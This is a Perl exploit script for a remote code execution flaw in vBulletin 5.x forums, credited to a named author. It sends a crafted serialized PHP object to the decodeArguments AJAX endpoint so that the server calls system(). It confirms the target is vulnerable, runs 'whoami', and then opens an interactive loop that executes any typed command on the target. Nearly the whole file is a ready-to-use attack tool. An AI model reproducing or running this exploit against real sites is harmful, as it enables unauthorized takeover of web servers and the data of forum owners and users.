#[+] Title:  Vbulletin 5.x - Remote Code Execution Exploit
#[+] Product: vbulletin
#[+] Vendor: http://vbulletin.com
#[+] Vulnerable Version(s): Vbulletin 5.x
#
#
# Author      :   Mohammad Reza Espargham
# Linkedin    :   https://ir.linkedin.com/in/rezasp
# E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com
# Website     :   www.reza.es
# Twitter     :   https://twitter.com/rezesp
# FaceBook    :   https://www.facebook.com/reza.espargham
# Special Thanks : Mohammad Emad

system(($^O eq 'MSWin32') ? 'cls' : 'clear');

use LWP::UserAgent;
use LWP::Simple;
$ua = LWP::UserAgent ->new;

print "\n\t Enter Target [ Example:http://target.com/forum/ ]";
print "\n\n \t Enter Target : ";
$Target=<STDIN>;
chomp($Target);


$response=$ua->get($Target . '/ajax/api/hook/decodeArguments?arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:20:"echo%20$((0xfee10000))";}');

$source=$response->decoded_content;
if (($source =~ m/4276158464/i))
{
    $response=$ua->get($Target . '/ajax/api/hook/decodeArguments?arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:6:"whoami";}');
    $user=$response->decoded_content;
    chomp($user);
    print "\n Target Vulnerable ;)\n";
    while($cmd=="exit")
    {
        print "\n\n$user\$ ";
        $cmd=<STDIN>;
        chomp($cmd);
        if($cmd =~ m/exit/i){exit 0;}
        $len=length($cmd);
        $response=$ua->get($Target . '/ajax/api/hook/decodeArguments?arguments=O:12:"vB_dB_Result":2:{s:5:"%00*%00db";O:11:"vB_Database":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"system";}}s:12:"%00*%00recordset";s:'.$len.':"'.$cmd.'";}');
        print "\n".$response->decoded_content;

   }
}else{print "\ntarget is not Vulnerable\n\n"}